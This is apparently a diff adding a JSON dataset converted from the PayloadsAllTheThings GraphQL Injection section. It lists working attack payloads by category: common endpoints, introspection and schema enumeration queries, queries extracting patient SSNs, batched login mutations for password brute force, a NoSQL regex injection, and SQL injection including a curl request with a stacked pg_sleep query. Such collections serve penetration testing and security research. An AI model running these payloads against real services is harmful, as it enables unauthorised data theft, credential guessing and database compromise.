@@ -1,0 +1,260 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "graphql",
+  "original_category": "GraphQL Injection",
+  "payloads": [
+    {
+      "category": "Common GraphQL Endpoints",
+      "escalation": "baseline",
+      "lines": [
+        "/v1/explorer",
+        "/v1/graphiql",
+        "/graph",
+        "/graphql",
+        "/graphql/console/",
+        "/graphql.php",
+        "/graphiql",
+        "/graphiql.php"
+      ]
+    },
+    {
+      "category": "Identify An Injection Point",
+      "escalation": "baseline",
+      "lines": [
+        "example.com/graphql?query={__schema{types{name}}}",
+        "example.com/graphiql?query={__schema{types{name}}}",
+        "?query={__schema}",
+        "?query={}",
+        "?query={thisdefinitelydoesnotexist}"
+      ]
+    },
+    {
+      "category": "Enumerate Database Schema via Introspection",
+      "escalation": "baseline",
+      "lines": [
+        "fragment FullType on __Type {",
+        "kind",
+        "name",
+        "description",
+        "fields(includeDeprecated: true) {",
+        "name",
+        "description",
+        "args {",
+        "...InputValue",
+        "}",
+        "type {",
+        "...TypeRef",
+        "}",
+        "isDeprecated",
+        "deprecationReason",
+        "}",
+        "inputFields {",
+        "...InputValue",
+        "}",
+        "interfaces {",
+        "...TypeRef",
+        "}",
+        "enumValues(includeDeprecated: true) {",
+        "name",
+        "description",
+        "isDeprecated",
+        "deprecationReason",
+        "}",
+        "possibleTypes {",
+        "...TypeRef",
+        "}",
+        "}",
+        "fragment InputValue on __InputValue {",
+        "name",
+        "description",
+        "type {",
+        "...TypeRef",
+        "}",
+        "defaultValue",
+        "}",
+        "fragment TypeRef on __Type {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "ofType {",
+        "kind",
+        "name",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "}",
+        "query IntrospectionQuery {",
+        "__schema {",
+        "queryType {",
+        "name",
+        "}",
+        "mutationType {",
+        "name",
+        "}",
+        "types {",
+        "...FullType",
+        "}",
+        "directives {",
+        "name",
+        "description",
+        "locations",
+        "args {",
+        "...InputValue",
+        "}",
+        "}",
+        "}",
+        "}"
+      ]
+    },
+    {
+      "category": "Enumerate Database Schema via Suggestions",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",",
+        "}"
+      ]
+    },
+    {
+      "category": "Enumerate Types Definition",
+      "escalation": "baseline",
+      "lines": [
+        "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}"
+      ]
+    },
+    {
+      "category": "List Path To Reach A Type",
+      "escalation": "baseline",
+      "lines": [
+        "$ git clone https://gitlab.com/dee-see/graphql-path-enum",
+        "$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill",
+        "Found 27 ways to reach the \"Skill\" node from the \"Query\" node:",
+        "- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+        "- Query (query) -> Query (skills) -> Skill"
+      ]
+    },
+    {
+      "category": "Extract Data",
+      "escalation": "baseline",
+      "lines": [
+        "example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}"
+      ]
+    },
+    {
+      "category": "Extract Data Using Edges/Nodes",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "\"query\": \"query {",
+        "teams{",
+        "total_count,edges{",
+        "node{",
+        "id,_id,about,handle,state",
+        "}",
+        "}",
+        "}",
+        "}\"",
+        "}"
+      ]
+    },
+    {
+      "category": "Extract Data Using Projections",
+      "escalation": "baseline",
+      "lines": [
+        "{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}"
+      ]
+    },
+    {
+      "category": "GraphQL Batching Attacks",
+      "escalation": "baseline",
+      "lines": [
+        "[",
+        "{",
+        "\"query\":\"...\"",
+        "},{",
+        "\"query\":\"...\"",
+        "}",
+        ",{",
+        "\"query\":\"...\"",
+        "}",
+        ",{",
+        "\"query\":\"...\"",
+        "}",
+        "...",
+        "]",
+        "{",
+        "\"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"",
+        "}",
+        "mutation {",
+        "login(pass: 1111, username: \"bob\")",
+        "second: login(pass: 2222, username: \"bob\")",
+        "third: login(pass: 3333, username: \"bob\")",
+        "fourth: login(pass: 4444, username: \"bob\")",
+        "}"
+      ]
+    },
+    {
+      "category": "NOSQL Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "doctors(",
+        "options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\",",
+        "search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")",
+        "{",
+        "firstName lastName id patients{ssn}",
+        "}",
+        "}"
+      ]
+    },
+    {
+      "category": "SQL Injection",
+      "escalation": "baseline",
+      "lines": [
+        "{",
+        "bacon(id: \"1'\") {",
+        "id,",
+        "type,",
+        "price",
+        "}",
+        "}",
+        "curl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.870Z"
+}
